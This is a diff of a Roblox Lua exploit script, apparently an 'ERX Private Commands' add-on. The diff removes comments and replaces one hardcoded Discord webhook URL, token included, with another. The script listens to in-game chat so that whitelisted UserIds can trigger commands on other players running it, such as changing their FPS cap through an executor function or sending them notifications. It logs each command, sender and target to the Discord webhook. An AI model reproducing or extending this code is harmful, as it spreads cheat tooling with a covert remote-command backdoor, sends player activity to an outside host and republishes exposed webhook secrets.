@@ -1,7 +1,3 @@
---====================================--
--- ERX Private Commands Protection Fix
---====================================--
-
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local AnalyticsService = game:GetService("RbxAnalyticsService")
@@ -13,11 +9,7 @@ local Actions = FE:WaitForChild("Actions", 9e9)
 local EnviromentRemote = Actions:WaitForChild("Environmental", 9e9)
 
 local webhookURL =
-    "https://discord.com/api/webhooks/1439537916174008420/p8br6BWX6t-4HRSZn25Hafy7FGkYEL6ky4IXEgVh_7Bus5Pebqoc1ImuLmfSESLWvjD3"
-
---============================--
--- Helper Functions
---============================--
+    "https://discord.com/api/webhooks/1439696796686225638/hfg2yu0LrvxZV1Gm74xSI2dKEiNKHzdYdGRZQJDzN4-gZwVCeV5nMfWm1pYIb20nPLHT"
 
 local function sendWebhook(command, senderName, target, extra)
     local data = {
@@ -81,7 +73,6 @@ local function IsERXPrivate()
     return userName ~= "Unknown", userName
 end
 
--- WindUI Notify if verified
 local isPrivate, user = IsERXPrivate()
 if isPrivate and _G.WindUI then
     _G.WindUI:Notify({
@@ -90,10 +81,6 @@ if isPrivate and _G.WindUI then
         Duration = 8
     })
 end
-
---============================--
--- Private Commands
---============================--
 
 local function isSelf(target)
     return target == LocalPlayer
@@ -218,7 +205,6 @@ end
 
 PrivateCommands[":setfps"] = function(target, fpsValue)
     if not isSelf(target) then return end
-    -- setfps only affects YOUR CLIENT → only allow if the target IS YOU
     fpsValue = tonumber(fpsValue)
     if fpsValue and setfpscap then
         setfpscap(fpsValue)
@@ -264,10 +250,6 @@ PrivateCommands[":notify"] = function(target, msg)
     end
 end
 
---============================--
--- Protected Player Check
---============================--
-
 local function IsProtectedPlayer(player)
     if not player then return false end
     local name = player.Name:lower()
@@ -275,7 +257,6 @@ local function IsProtectedPlayer(player)
     return name:find("fuhtwan") or display:find("fuhtwan")
 end
 
--- Wrap all PrivateCommands to skip protected players
 local function WrapPrivateCommand(func)
     return function(target, ...)
         if IsProtectedPlayer(target) then
@@ -296,10 +277,6 @@ for cmd, func in pairs(PrivateCommands) do
     PrivateCommands[cmd] = WrapPrivateCommand(func)
 end
 
---============================--
--- Chat Hook
---============================--
-
 Chat.OnClientEvent:Connect(function(senderName, message)
     local sender = Players:FindFirstChild(senderName)
     if not sender then return end
@@ -313,7 +290,6 @@ Chat.OnClientEvent:Connect(function(senderName, message)
     local extra = table.concat(args, " ")
     local target = Players:FindFirstChild(targetName)
 
-    -- Prevent commands from affecting protected players
     if target and IsProtectedPlayer(target) then
         if _G.WindUI then
             _G.WindUI:Notify({
@@ -325,7 +301,6 @@ Chat.OnClientEvent:Connect(function(senderName, message)
         return
     end
 
-    -- Prevent affecting LocalPlayer unless sender is whitelisted
     if target == LocalPlayer then
         local allowed =
             (sender.UserId == 8244720493) or
@@ -333,10 +308,8 @@ Chat.OnClientEvent:Connect(function(senderName, message)
         if not allowed then return end
     end
 
-    -- Prevent self-targeting
     if sender == LocalPlayer and target == LocalPlayer then return end
 
-    -- Execute command
     if PrivateCommands[command] then
         PrivateCommands[command](target, extra)
         sendWebhook(command, senderName, target, extra)
